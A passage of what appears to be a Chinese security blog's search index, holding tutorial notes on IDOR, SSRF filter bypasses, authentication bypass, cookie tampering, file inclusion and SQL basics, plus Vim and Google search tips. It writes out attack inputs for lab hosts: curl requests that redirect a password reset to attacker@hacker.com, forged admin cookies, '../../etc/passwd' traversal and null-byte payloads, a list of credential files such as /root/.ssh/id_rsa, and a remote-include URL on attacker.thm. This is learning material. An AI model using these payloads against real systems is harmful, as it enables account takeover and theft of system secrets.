号查看其他用户的内容，同时仍然使用其他账户登录（或根本未登录），则您发现了有效的 IDOR 漏洞。\nIDOR在哪里 您所针对的易受攻击的终端节点可能并不总是您在地址栏中看到的。它可能是您的浏览器通过 AJAX 请求加载的内容，或者您在 JavaScript 文件中找到引用的内容。\n有时，终端节点可能有一个未引用的参数，该参数可能在开发过程中有所用处，并被推送到生产环境中。例如，您可能会注意到对 /user/details 的调用显示您的用户信息（通过您的会话进行身份验证）。但是通过一种称为参数挖掘的攻击，您发现了一个名为 user_id 的参数，您可以使用它来显示其他用户的信息，例如 /user/details？user_id=123\n","date":"2025-03-19T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/54afbc538832e9159efdc2ac951b4fabecad8304bd717a9aece08e26440c0690.png","permalink":"https://Yerucrem.github.io/p/idor%E5%9F%BA%E7%A1%80/","title":"IDOR基础"},{"content":"SSRF基础 什么是SSRF SSRF 代表服务器端请求伪造。这是一个漏洞，允许恶意用户使 Web 服务器向攻击者选择的资源发出额外或经过编辑的 HTTP 请求。\nSSRF 的类型 SSRF 漏洞有两种类型;第一个是常规 SSRF，其中数据返回到攻击者的屏幕。第二个是盲目 SSRF 漏洞，其中发生了 SSRF，但没有信息返回到攻击者的屏幕。\n影响是什么？ 成功的 SSRF 攻击可能导致以下任何情况：\n进入未经授权的区域。 访问客户/组织数据。 能够扩展到内部网络。 显示身份验证令牌/凭据。 查找SSRF漏洞 可以通过多种不同的方式在 Web 应用程序中发现潜在的 SSRF 漏洞。以下是四个常见位置的示例：\n当地址栏的参数中使用完整 URL 时：\n表单中的隐藏字段：\n部分 URL，例如主机名：\n或者可能只是 URL 的路径：\n其中一些示例比其他示例更容易被利用，因此需要进行大量试验和错误才能找到有效的有效负载。\n如果使用盲 SSRF，并且没有输出反射给您，则需要使用外部 HTTP 日志记录工具来监控请求，例如 requestbin.com、您自己的 HTTP 服务器或 Burp Suite 的协作者客户端。\n常见的防御手段与应对 更了解安全漏洞的开发人员意识到 SSRF 漏洞的风险，可以在其应用程序中实施检查，以确保请求的资源符合特定规则。通常有两种方法，拒绝列表或允许列表。\n拒绝列表 在拒绝列表 （Deny List） 中，接受除列表中指定的资源或与特定模式匹配的资源之外的所有请求。Web 应用程序可以使用拒绝列表来保护敏感端点、IP 地址或域不被公众访问，同时仍允许访问其他位置。限制访问的特定端点是 localhost，它可能包含服务器性能数据或其他敏感信息，因此 localhost 和 127.0.0.1 等域名会出现在拒绝列表中。攻击者可以使用替代本地主机引用绕过拒绝列表，例如 0、0.0.0.0、0000、127.1、127...*、2130706433、017700000001 或具有解析为 IP 地址 127.0.0.1 的 DNS 记录的子域，例如 127.0.0.1.nip.io。\n此外，在云环境中，阻止对 IP 地址 169.254.169.254 的访问将是有益的，该地址包含已部署云服务器的元数据，包括可能的敏感信息。攻击者可以通过在自己的域上注册一个子域来绕过此问题，该子域的 DNS 记录指向 IP 地址 169.254.169.254。\n允许列表 在允许列表中，除非所有请求都显示在列表中或与特定模式匹配，例如参数中使用的 URL 必须以 https://website.thm 开头的规则，否则所有请求都会被拒绝。攻击者可以通过在攻击者的域名上创建子域（例如 https://website.thm.attackers-domain.thm）来快速规避此规则。应用程序逻辑现在将允许此输入，并允许攻击者控制内部 HTTP 请求。\n打开重定向 如果上述绕过不起作用，那么攻击者还有一个技巧，即开放重定向。开放重定向是服务器上的一个端点，网站访问者会在其中自动重定向到另一个网站地址。以 link https://website 为例。thm/link？url=https：//tryhackme.com 的创建此端点是为了记录访客出于广告/营销目的点击此链接的次数。但是想象一下，存在一个潜在的 SSRF 漏洞，其严格的规则只允许以 https://website 开头的 URL。thm/。攻击者可以利用上述功能将内部 HTTP 请求重定向到攻击者选择的域。\n","date":"2025-03-19T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/5e5493849d8aa623ccc456998df80032a5625b429097b062a957b14d4fce5079.png","permalink":"https://Yerucrem.github.io/p/ssrf-1/","title":"SSRF-1"},{"content":"常见工具及使用技巧 VIM 粘贴 1. 普通模式下的粘贴 p：在光标后粘贴内容（默认粘贴 Vim 的匿名寄存器 \u0026quot;\u0026quot; 中的内容）。 P（大写）：在光标前粘贴内容。 \u0026quot;+p 或 \u0026quot;*p：粘贴系统剪贴板内容（需确保 Vim 支持系统剪贴板，例如在 Linux 安装 vim-gtk 或 vim-gnome）。 示例：\nvim\n复制\n1 2 3 4 yy # 复制当前行到匿名寄存器 p # 在光标后粘贴 \u0026#34;+yy # 复制当前行到系统剪贴板 \u0026#34;+p # 粘贴系统剪贴板内容 2. 插入模式下的粘贴 **\n1 Ctrl+R + 寄存器名**：在插入模式下粘贴指定寄存器的内容。\nCtrl+R \u0026quot;：粘贴匿名寄存器的内容。 Ctrl+R +：粘贴系统剪贴板内容（+ 寄存器）。 示例：\nvim\n复制\n1 2 i # 进入插入模式 Ctrl+R + # 粘贴系统剪贴板内容 3. 粘贴模式（避免自动缩进） 当粘贴代码时，自动缩进可能导致格式混乱。解决方式：\n:set paste：进入粘贴模式（禁用自动缩进）。 :set nopaste：退出粘贴模式。 或者用快捷键：\nvim\n复制\n1 2 \u0026#34; 在插入模式下直接粘贴系统剪贴板（自动处理格式） Shift + Insert # 部分终端支持 4. 选择系统剪贴板寄存器 \u0026quot;+y：复制内容到系统剪贴板。 \u0026quot;+p：粘贴系统剪贴板内容。 系统差异：\nLinux：通常使用 \u0026quot;+ 寄存器。 Windows/macOS：\u0026quot;+ 和 \u0026quot;* 可能通用。 5. 可视化模式下的粘贴 在可视化模式（\n1 v /\n1 V /\n1 Ctrl+V ）中选择文本后：\ny 复制，d 剪切，p 粘贴。 6. 常见问题 粘贴时代码缩进错乱：使用 :set paste 或 \u0026quot;+p 从系统剪贴板粘贴。 无法访问系统剪贴板：确保 Vim 支持 +clipboard（终端输入 vim --version 检查）。 撤销 1. 基础撤销与重做 u（普通模式下）：撤销最近一次操作（可重复按 u 逐步回退）。 Ctrl-R（普通模式下）：重做被撤销的操作（恢复最后一次撤销）。 示例：\nvim\n复制\n1 2 3 dd # 删除一行 u # 撤销删除（恢复该行） Ctrl-R # 重做删除（再次删除该行） 2. 多步撤销与重做 多次按 u：逐次撤销更早的操作（Vim 会记录完整的操作历史）。 多次按 Ctrl-R：逐次重做被撤销的操作。\n3. 撤销到指定状态 :undo N：直接回退到第 N 次修改前的状态（例如 :undo 5）。 :earlier 5s：回退到 5 秒前的状态（支持 s/m/h 单位，如 :earlier 2m）。 :later 5s：向未来恢复 5 秒后的状态。 4. 撤销分支（Undo Tree） Vim 的撤销历史是一个树形结构（分支），允许在不同修改路径间切换：\ng+ 或 :earlier 1f：跳转到更新的分支版本。 g- 或 :later 1f：跳转到更旧的分支版本。 插件推荐：使用 undotree 可视化撤销历史。 5. 撤销插入模式内容 在插入模式（i）中输入大量文本后，退出到普通模式按 u，会撤销整个插入过程（视为一次操作）。 示例：\nvim\n复制\n1 2 3 i # 进入插入模式 Hello World\u0026lt;Esc\u0026gt; # 输入文本并退出 u # 撤销整个插入（文本消失） 6. 重置修改点 :w（保存文件）：保存后会重置撤销历史的起点（无法撤销保存前的操作）。 :e!：强制重新加载文件（丢弃所有未保存的修改，回到保存状态）。 7. 查看撤销历史 :undolist：显示所有可撤销的修改点（版本号和编号）。 :changes：显示最近的修改列表（结合 g; 和 g, 跳转）。 常见问题 误操作后无法撤销：确保未执行保存（:w）或外部命令打断了撤销链。 撤销粒度问题：Vim 将一次连续操作视为一个撤销单位（例如插入模式中的输入视为一次操作）。 Google搜索 序号 语法 语法说明 示例 示例说明 1 + 同AND，搜索包含多个关键词的结果 搜索 + 引擎 搜索包含【搜索】和【引擎】两个词的页面 2 OR 或者 搜索 OR 引擎 搜索包含【搜索】或【引擎】两个词的页面 3 - 减号，不包含减号后面词的页面 搜索引擎 -百度 搜索不包括【百度】的【搜索引擎】的页面 4 “” 双引号，精确匹配 “搜索引擎” 精确匹配【搜索引擎】这个关键词的页面 5 ***** 星号，通配符，模糊搜索，星号代替某个字 搜*引擎 星号可以为任何字 6 @ 在用于搜索社交媒体的字词前加上@ trump @twitter 搜索trump的twitter 7 $ 在数字前加上$搜索特定价格 camera $400 搜索400$的camera 8 # 搜索 # 标签 #throwbackthursday 搜索标签throwbackthursday 9 .. 两个点，在两个数字之间加上.. 在数字范围内执行搜索 camera 500..1000 搜索500−1000的camera 10 filetype 搜索某一种文件类型的资源 C++ filetype:pdf 搜索类型为pdf的C++网页资源 11 site 在指定站点搜索 C++ site:https://www.zhihu.com 在知乎中搜索和C++相关的网页 12 cache 查看网站的 Google 缓存版本，会直接显示缓存页面 cache:weibo.com 查看微博的谷歌快照 13 info 在网址前加info:，获取网站详情 info:github.com 搜索github网站详情 14 related 搜索与某个网站有关联的页面 related:sina.com 和新浪网网站结构内容相似的一些其它网站 15 link 返回所有链接到某个URL地址的网页 link:www.csdn.net 搜索所有含指向【www.csdn.net】链接的网页 16 inurl 搜索查询词出现在url 中的页面 inurl:搜索引擎 搜索链接url中有【搜索引擎】的网页 17 intitle 搜索查询词出现在页面标题(title)中的页面，支持中文和英文 intitle:搜索引擎 搜索页面标题中有【搜索引擎】的网页 18 intext 搜索查询词出现在页面正文(title)中的页面，支持中文和英文 SEO intext:搜索引擎 在正文包含【搜索引擎】的网页中搜索【SEO】 19 inanchor 搜索链接锚文字(即链接显示的文字)中包含搜索词的页面 inanchor:前端 搜索链接锚文字中包含【前端】的页面 20 allinurl 即all+inurl 页面url中包含多个关键词的页面 allinurl:SEO 搜索引擎优化 相当于 ：inurl:SEO inurl:搜索引擎优化 21 allintitle 即all+intitle 页面标题中包含多个关键词的页面 allintitle:SEO 搜索引擎优化 相当于：intitle:SEO intitle:搜索引擎优化 22 allintext 即all+inanchor 页面正文包含多个关键词的页面 allintext:SEO 搜索引擎优化 相当于：intext:SEO intext:搜索引擎优化 23 allinanchor 即all+inanchor 页面链接锚文字包含多个关键词的页面 allinanchor:SEO 搜索引擎优化 相当于：inanchor:SEO inanchor:搜索引擎优化 24 weather weather/time/sunrise/sundown+城市名，返回城市的天气/时间/日出时间/日落时间 weather:beijing 显示北京的天气 25 music 或者用songs，歌手名字+music/songs 周杰伦 music 返回周杰伦的各首歌曲 ","date":"2025-03-19T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/tomb-8622722.jpg","permalink":"https://Yerucrem.github.io/p/%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/","title":"常见工具及使用技巧"},{"content":"身份验证绕过 用户名枚举 暴力 逻辑缺陷 什么是逻辑缺陷？ 有时身份验证过程包含逻辑缺陷。逻辑缺陷是指应用程序的典型逻辑路径被黑客绕过、规避或纵。逻辑缺陷可以存在于网站的任何区域，但在这种情况下，我们将专注于与身份验证相关的示例。\n逻辑缺陷示例 下面的模拟代码示例检查客户端正在访问的路径的开头是否以 /admin 开头，如果是，则进行进一步检查以查看客户端是否实际上是 admin。如果页面不以 /admin 开头，则会向客户端显示该页面。\n1 2 3 4 5 if( url.substr(0,6) === \u0026#39;/admin\u0026#39;) { # Code to check user is an admin } else { # View Page } 因为上面的 PHP 代码示例使用了三个等号 （===），所以它正在查找字符串的完全匹配项，包括相同的字母大小写。该代码存在逻辑缺陷，因为请求 /adMin 的未经身份验证的用户将不会检查其权限，而是向他们显示页面，从而完全绕过身份验证检查。\n逻辑缺陷实用 我们将检查 Acme IT 支持网站 （http：//MACHINE_IP/customers/reset） 的重置密码 功能。我们看到一个表单，要求提供与我们希望执行密码重置的账户关联的电子邮件地址。如果输入的电子邮件无效，您将收到错误消息Account not found from provided email address\n出于演示目的，我们将使用 email address robert@acmeitsupport.thm被接受。然后，我们会看到表单的下一阶段，该阶段要求提供与此登录电子邮件地址关联的用户名。如果我们输入 robert 作为用户名并按下 Check Username 按钮，您将看到一条确认消息，告知将向 robert@acmeitsupport.thm发送一封密码重置电子邮件。\n在此阶段，您可能想知道此应用程序中的漏洞可能是什么，因为您必须知道电子邮件和用户名，然后将密码链接发送到帐户所有者的电子邮件地址。\n在重置电子邮件过程的第二步中，用户名在 POST 字段中提交到 Web 服务器，电子邮件地址在查询字符串请求中作为 GET 字段发送。\n让我们通过使用 curl 工具手动向 Web 服务器发出请求来说明这一点。\n1 user@tryhackme$ curl \u0026#39;http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm\u0026#39; -H \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -d \u0026#39;username=robert\u0026#39; 我们使用该标志向请求添加额外的标头。在这种情况下，我们将 设置为 ，这让 Web 服务器知道我们正在发送表单数据，以便它正确理解我们的请求。\n在应用程序中，使用查询字符串检索用户帐户，但稍后，在应用程序逻辑中，使用 PHP 变量 $_REQUEST 中的数据发送密码重置电子邮件。\nPHP$_REQUEST 变量是一个数组，其中包含从查询字符串接收的数据和 POST 数据。如果查询字符串和 POST 数据使用相同的键名称，则此变量的应用程序逻辑优先使用 POST 数据字段而不是查询字符串，因此，如果我们向 POST 表单添加另一个参数，我们可以控制密码重置电子邮件的发送位置。\n1 user@tryhackme$ curl \u0026#39;http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm\u0026#39; -H \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -d \u0026#39;username=robert\u0026amp;email=attacker@hacker.com\u0026#39; **下一步，您需要在 Acme IT 支持客户部分创建一个帐户，这样做会为您提供一个可用于创建支持票证的唯一电子邮件地址。电子邮件地址的格式为 {username}@customer.acmeitsupport.thm\n现在重新运行 Curl 请求 2，但使用您的 @acmeitsupport。thm 在电子邮件字段中，您将在您的帐户上创建一个票证，其中包含一个链接，用于以 Robert 身份登录。使用 Robert 的帐户，您可以查看他们的支持票证并显示标志。\n1 user@tryhackme:~$ curl \u0026#39;http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm\u0026#39; -H \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -d \u0026#39;username=robert\u0026amp;email={username}@customer.acmeitsupport.thm\u0026#39; Cookie 篡改 在联机会话期间检查和编辑 Web 服务器设置的 Cookie 可能会产生多种结果，例如未经身份验证的访问、访问其他用户帐户或提升的权限。\n纯文本 某些 cookie 的内容可以是纯文本形式，并且它们的作用很明显。例如，如果这些是成功登录后设置的 Cookie：\n1 2 Set-Cookie: logged_in=true; Max-Age=3600; Path=/ Set-Cookie: admin=false; Max-Age=3600; Path=/ 我们看到一个 Cookie （logged_in），它似乎用于控制用户当前是否登录，以及另一个 （admin），它控制访客是否具有管理员权限。使用这个逻辑，如果我们要更改 cookie 的内容并发出请求，我们将能够更改我们的权限。\n首先，我们先请求目标页面：\n1 user@tryhackme$ curl http://MACHINE_IP/cookie-test 我们可以看到我们返回了一条消息：Not Logged In\n现在，我们将发送另一个请求，其中 logged_in Cookie 设置为 true，管理 Cookie 设置为 false：\n1 user@tryhackme$ curl -H \u0026#34;Cookie: logged_in=true; admin=false\u0026#34; http://MACHINE_IP/cookie-test 我们收到消息：Logged In As A User\n最后，我们将发送最后一个请求，将 logged_in 和 admin Cookie 都设置为 true：\n1 user@tryhackme$ curl -H \u0026#34;Cookie: logged_in=true; admin=true\u0026#34; http://MACHINE_IP/cookie-test 这将返回结果：Logged In As An Admin\nHashing 散列法 有时 Cookie 值看起来像一长串随机字符;这些称为哈希，它是原始文本的不可逆表示。以下是您可能会遇到的一些示例：\n原始字符串 ** 哈希方法** 输出 1 md5 c4ca4238a0b923820dcc509a6f75849b 1 sha-256 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b 1 sha-512 4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a 1 sha1 356a192b7913b04c54574d18c28d46e6395428ab 从上表中可以看出，同一输入字符串的哈希输出可能会因使用的哈希方法而显著不同。即使哈希是不可逆的，但每次都会产生相同的输出，这对我们很有帮助，因为 https://crackstation.net/ 等服务会保留数十亿个哈希及其原始字符串的数据库。\n编码 编码类似于哈希，因为它会创建看似随机的文本字符串，但实际上，编码是可逆的。所以这就引出了一个问题，编码的意义何在？编码使我们能够将二进制数据转换为人类可读的文本，这些文本可以通过仅支持纯文本 ASCII 字符的介质轻松安全地传输。\n常见的编码类型包括 base32 和 base64，前者将二进制数据转换为字符 A-Z 和 2-7，后者使用字符 a-z、A-Z、0-9、+ 和 equals 符号进行转换进行填充。\n以以下数据为例，该数据由 Web 服务器在登录时设置：\n1 Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/ 这个字符串 base64 解码的值为 {“id”：1，“admin”： false} ，然后我们可以再次将其编码回 base64 编码，但将 admin 值设置为 true，这现在为我们提供了管理员访问权限。\n","date":"2025-03-19T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/4e4cc31a34179ac0e517d1c37a2925a57eb72a8878519af127e313034f388b04.png","permalink":"https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-1/","title":"身份验证绕过-1"},{"content":"文件包含基础 介绍 此房间旨在为您提供利用文件包含漏洞的基本知识，包括本地文件包含 （LFI）、远程文件包含 （RFI） 和目录遍历。此外，我们还将讨论发现这些漏洞的风险以及所需的补救措施。我们提供了每个漏洞的一些实际示例以及实践挑战。\n在某些情况下，编写 Web 应用程序是为了通过参数请求访问给定系统上的文件，包括图像、静态文本等。参数是附加到 URL 的查询参数字符串，可用于检索数据或根据用户输入执行作。 下图分解了 URL 的基本部分。\n例如，参数用于 Google 搜索，其中 GET 请求将用户输入传递到搜索引擎中。 https://www.google.com/search?q=TryHackMe。\n让我们讨论一个用户请求从 Web 服务器访问文件的场景。首先，用户向 Web 服务器发送一个 HTTP 请求，其中包含要显示的文件。例如，如果用户想要在 Web 应用程序中访问和显示其 CV，则请求可能如下所示，http://webapp.thm/get.php?file=userCV.pdf，其中 file 是参数，userCV.pdf是要访问的必需文件。\n为什么会出现文件包含漏洞？ 文件包含漏洞通常在 Web 应用程序（如 PHP ）的各种编程语言 中发现和利用，这些应用程序编写和实现都很糟糕。这些漏洞的主要问题是输入验证，其中用户输入没有经过清理或验证，由用户控制它们。当输入未经过验证时，用户可以将任何输入传递给函数，从而导致漏洞。\n文件包含有什么风险？ 默认情况下，攻击者可以利用文件包含漏洞来泄露数据，例如代码、凭据或与 Web 应用程序或作系统相关的其他重要文件。此外，如果攻击者可以通过任何其他方式将文件写入服务器，则文件包含可能会协同使用以获得远程命令执行 （RCE）。\n路径遍历 也称为目录遍历，允许攻击者读取作系统资源，例如运行应用程序的服务器上的本地文件。攻击者通过纵和滥用 Web 应用程序的 URL 来查找和访问存储在应用程序根目录之外的文件或目录，从而利用此漏洞。\n当用户的输入传递到 PHP 中的 file_get_contents 等函数时，会出现路径遍历漏洞。请务必注意，该函数并不是导致此漏洞的主要因素。通常，糟糕的输入验证或筛选是导致此漏洞的原因。在 PHP 中，您可以使用 file_get_contents 读取文件的内容。\n下图显示了 Web 应用程序如何在 /var/www/app 中存储文件。满意的路径是用户请求 从定义的路径 /var/www/app/CVs userCV.pdf。\n我们 可以通过添加有效负载来测试 URL 参数，以查看 Web 应用程序的行为方式。路径遍历攻击，也称为点-点-斜杠攻击，利用双点将目录上移一步。 如果攻击者找到入口点，在本例中为 get.php?file=，那么攻击者可能会发送如下内容 http://webapp.thm/get.php?file=../../../../etc/passwd\n假设没有输入验证，而不是访问 PDF 文件位于 /var/www/app/CVs 位置，则 Web 应用程序会从其他 目录，在本例中为 /etc/passwd。每个 .. 条目都会移动一个目录，直到到达根目录 /。然后，它将目录更改为 /etc，然后从那里读取 passwd 文件。\n因此，Web 应用程序将文件的内容发送回给用户。\n同样，如果 Web 应用程序在 Windows 服务器上运行，攻击者需要提供 Windows 路径。例如，如果攻击者想要读取位于c:\\boot.ini 中的 boot.ini 文件，则攻击者可以根据目标尝试以下作 作系统版本：\n1 2 3 http://webapp.thm/get.php?file=../../../../boot.ini 或 http://webapp.thm/get.php?file=../../../../windows/win.ini 与 Linux作系统相同的概念在这里适用，在这种作系统中，我们爬上目录直到它到达根目录，这通常是 .\n有时，开发人员会添加过滤器以限制仅访问某些文件或目录。以下是测试时可以使用的一些常见作系统文件。\n位置 描述 /etc/issue 包含要在登录提示之前打印的消息或系统标识。 /etc/profile 控制系统范围的默认变量，如导出变量、文件创建掩码 （umask）、终端类型、邮件消息，以指示新邮件何时到达 /proc/version 指定 Linux 内核的版本 etc/passwd 等/passwd 具有有权访问系统的所有注册用户 /etc/shadow 包含有关系统用户密码的信息 /root/.bash_history 包含 root 用户的 history 命令 /var/log/dmessage 包含全局系统消息，包括系统启动期间记录的消息 `/var/mail/root 根用户的所有电子邮件 /root/.ssh/id_rsa 服务器上 root 或任何已知有效用户的私有 SSH 密钥 /var/log/apache2/access.log Web 服务器的访问请求 C:\\boot.ini C：\\boot.ini 包含具有 BIOS 固件的计算机的启动选项 本地文件包含 LFI 一 针对 Web 应用程序的 LFI 攻击通常是由于开发人员缺乏安全意识。使用 PHP 时，使用 include、require、include_once 和 require_once 等功能通常会导致 Web 应用程序易受攻击。在这个房间里，我们将挑选 PHP，但值得注意的是，使用其他语言（如 ASP、JSP）甚至在 Node.js 应用程序中也会出现 LFI 漏洞。LFI 漏洞利用遵循与路径遍历相同的概念。\n1 2 3 \u0026lt;?PHP include($_GET[\u0026#34;lang\u0026#34;]); ?\u0026gt; 上面的 PHP 代码通过 URL 参数 lang 使用 GET 请求来包含页面的文件。可以通过发送以下 HTTP 请求来完成调用，如下所示：http://webapp.thm/index.php?lang=EN.php 加载英文页面或 http://webapp.thm/index.php?lang=AR.php加载阿拉伯语页面，其中 EN.php 和 AR.php文件位于同一目录中。\n理论上，如果没有任何输入验证，我们可以从上面的代码中访问和显示服务器上的任何可读文件。假设我们想读取 /etc/passwd 文件，其中包含有关 Linux作系统用户的敏感信息，我们可以尝试以下作：http://webapp.thm/get.php?file=/etc/passwd\n在这种情况下，它之所以有效，是因为 include 函数中没有指定目录，也没有输入验证。\n二 接下来，在下面的代码中，开发人员决定指定函数内部的目录。\n1 2 3 \u0026lt;?PHP include(\u0026#34;languages/\u0026#34;. $_GET[\u0026#39;lang\u0026#39;]); ?\u0026gt; 在上面的代码中，开发者决定使用 include 函数，只通过 lang 参数调用 languages 目录下的 PHP 页面。\n如果没有输入验证，攻击者可以通过将 lang 输入替换为其他作系统敏感文件（如 /etc/passwd）来纵 URL。\n同样，有效负载看起来类似于路径遍历，但 include 函数允许我们将任何调用的文件包含到当前页面中。以下是漏洞利用：\n1 http://webapp.thm/index.php?lang=../../../../etc/passwd 本地文件包含 LFI2 在这项任务中，我们将更深入地了解 LFI。我们讨论了在 include 函数中绕过过滤器的几种技术。\n在前两种情况下，我们检查了 Web 应用程序的代码，然后我们知道如何利用它。但是，在本例中，我们正在执行黑盒测试，其中我们没有源代码。在这种情况下，错误对于了解数据如何传递和处理到 Web 应用程序中非常重要。\n在此方案中，我们有以下入口点： http://webapp.thm/index.php?lang=EN 。如果我们输入无效的输入（例如 THM），则会收到以下错误\n1 Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12 错误消息泄露了重要信息。输入 THM 作为输入后，将显示一条错误消息，显示 include 函数的外观：include（languages/THM.php）;。\n如果你仔细查看该目录，我们可以看出 functions includes files in the languages 目录正在添加 .php 的 API 文件。因此，有效的输入将如下所示：index.php？lang=EN，其中文件 EN 位于给定的语言目录中，名为 EN。php 的\n此外，错误消息还泄露了有关完整 Web 应用程序目录路径的另一条重要信息，即 /var/www/html/THM-4/\n要利用这一点，我们需要使用 ../ 技巧，如 目录遍历 部分所述，以导出当前文件夹。让我们尝试以下作：\n1 http://webapp.thm/index.php?lang=../../../../etc/passwd 请注意，我们使用了 4 ../ 因为我们知道该路径有四个级别 /var/www/html/THM-4。但我们仍然收到以下错误：\n1 Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12 似乎我们可以移出 PHP 目录，但是 include 函数仍然使用 .PHP 最后！这告诉我们开发人员指定要传递给 include 函数的文件类型。要绕过这种情况，我们可以使用 NULL BYTE，即 %00。\n使用空字节是一种注入技术，其中 URL 编码的表示形式（如 %00 或 0x00）以十六进制表示形式与用户提供的数据一起终止字符串。您可以将其视为试图欺骗 Web 应用程序忽略 Null Byte 之后的任何内容。\n通过在有效负载的末尾添加 Null Byte，我们告诉 include 函数忽略 null 字节之后的任何内容，这可能如下所示：\n1 include(\u0026#34;languages/../../../../../etc/passwd%00\u0026#34;).\u0026#34;.php\u0026#34;); `等同于 `include(\u0026#34;languages/../../../../../etc/passwd\u0026#34;); 注意： %00 技巧是固定的，不适用于 PHP 5.3.4 及更高版本。\n四 现在在实验 #4 中应用这个技术，并弄清楚如何读取 /etc/passwd。\nhttp://webapp.thm/index.php?lang=../../../../etc/passwd\n我们收到了以下错误！\n1 Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15 如果我们检查 include（languages/etc/passwd） 部分中的警告消息，我们知道 Web 应用程序替换了 ../ 替换为空字符串。我们可以使用几种技术来绕过这种情况。\n首先，我们可以发送以下 payload 来绕过它： ....//....//....//....//....//etc/passwd\n这之所以有效，是因为 PHP 过滤器仅匹配并替换第一个子集字符串 ../ 它找到并且不执行另一次传递，留下下图所示的内容。\n五 最后，我们将讨论开发人员强制 include 从定义的目录中读取的情况！例如，如果 Web 应用程序要求提供必须包含目录的输入，例如： http://webapp.thm/index的php?lang=languages/EN.php然后，要利用这一点，我们需要将目录包含在有效负载中，如下所示： ?lang=languages/../../../../../etc/passwd 。\n远程文件包含 RFI 远程文件包含 （RFI） 是一种将远程文件包含到易受攻击的应用程序中的技术。与 LFI 一样，RFI 发生在对用户输入进行不当审查时，从而允许攻击者将外部 URL 注入 include 函数。RFI 的一个要求是需要打开 allow_url_fopen 选项。\nRFI 的风险高于 LFI，因为 RFI 漏洞允许攻击者在服务器上获得远程命令执行 （RCE）。RFI 攻击成功的其他后果包括：\n敏感信息泄露 跨站点脚本 （XSS） 拒绝服务 （DoS） 外部服务器必须与应用程序服务器通信，才能成功进行 RFI 攻击，攻击者在其服务器上托管恶意文件。然后，恶意文件通过 HTTP 请求注入 include 函数，恶意文件的内容在易受攻击的应用程序服务器上执行。\nRFI步骤 下图是成功进行 RFI 攻击的步骤示例！假设攻击者在他们自己的服务器 http：//attacker 上托管了一个 PHP 文件。thm/cmd.txt，其中 cmd.txt 包含打印消息 Hello THM.\n1 \u0026lt;?PHP echo \u0026#34;Hello THM\u0026#34;; ?\u0026gt; 首先，攻击者注入恶意 URL，该 URL 指向攻击者的服务器，例如 http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt的攻击者。THM/cmd.txt。如果没有输入验证，则恶意 URL 将传递到 include 函数中。接下来，Web 应用程序服务器将向恶意服务器发送 GET 请求以获取文件。因此，Web 应用程序将远程文件包含在 include 函数中，以执行页面内的 PHP 文件并将执行内容发送给攻击者。在我们的示例中，当前页面在某处必须显示 Hello THM 消息。\n","date":"2025-03-19T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/638445f84229dc4814eb81dfe06baeb837e3a5e8920ec39035d8dd6e02c0a10d.png","permalink":"https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/","title":"文件包含基础"},{"content":"SQL注入 SQL 语法不区分大小写。\nSQL基础 SELECT 我们将学习的第一种查询类型是用于从数据库中检索数据的 SELECT 查询。\nselect * from users;\n第一个单词 SELECT 告诉数据库我们想要检索一些数据;* 告诉数据库我们想从表中接收所有列。例如，该表可能包含三列（id、username 和 password）。“from users” 告诉数据库我们想要从名为 users 的表中检索数据。最后，末尾的分号告诉数据库这是查询的结束。\n下一个查询与上述查询类似，但这次，我们不是使用 * 返回数据库表中的所有列，而是只请求 username 和 password 字段。\nselect username,password from users;\n与第一个查询一样，以下查询使用 * 选择器返回所有列，然后 “LIMIT 1” 子句强制数据库仅返回一行数据。将查询更改为 “LIMIT 1,1” 会强制查询跳过第一个结果，然后 “LIMIT 2,1” 会跳过前两个结果，依此类推。您需要记住，第一个数字告诉数据库您希望跳过多少个结果，第二个数字告诉数据库要返回多少行。\nselect * from users LIMIT 1;\nselect * from users where username='admin';\n这只会返回 username 等于 admin 的行。\nselect * from users where username != 'admin';\n这只会返回 username 不 等于 admin 的行。\nselect * from users where username='admin' or username='jon';\n这只会返回用户名等于 admin 或 jon 的行。\nselect * from users where username='admin' and password='p4ssword';\n这只会返回用户名等于 admin 且密码等于 p4ssword 的行.\nlike 使用 like 子句允许您指定不完全匹配，而是以特定字符开头、包含或结尾的数据，方法是选择放置由百分号表示的通配符的位置。\nselect * from users where username like '%n';\n这将返回用户名以字母 n 结尾的任何行。\nselect * from users where username like '%mi%';\n这将返回用户名中包含字符 mi 的任何行。\nUNION UNION 语句将两个或多个 SELECT 语句的结果组合在一起，以从单个或多个表中检索数据;此查询的规则是 UNION 语句必须在每个 SELECT 语句中检索相同数量的列，列必须具有相似的数据类型，并且列顺序必须相同。这听起来可能不是很清楚，所以让我们使用下面的类比。假设一家公司想要为所有客户和供应商创建一个地址列表，以便发布新目录。我们有一个名为 customers 的表，其中包含以下内容：\n另一个表叫 suppliers，内容如下：\n使用以下 SQL 语句，我们可以从两个表中收集结果并将它们放入一个结果集中：\nSELECT 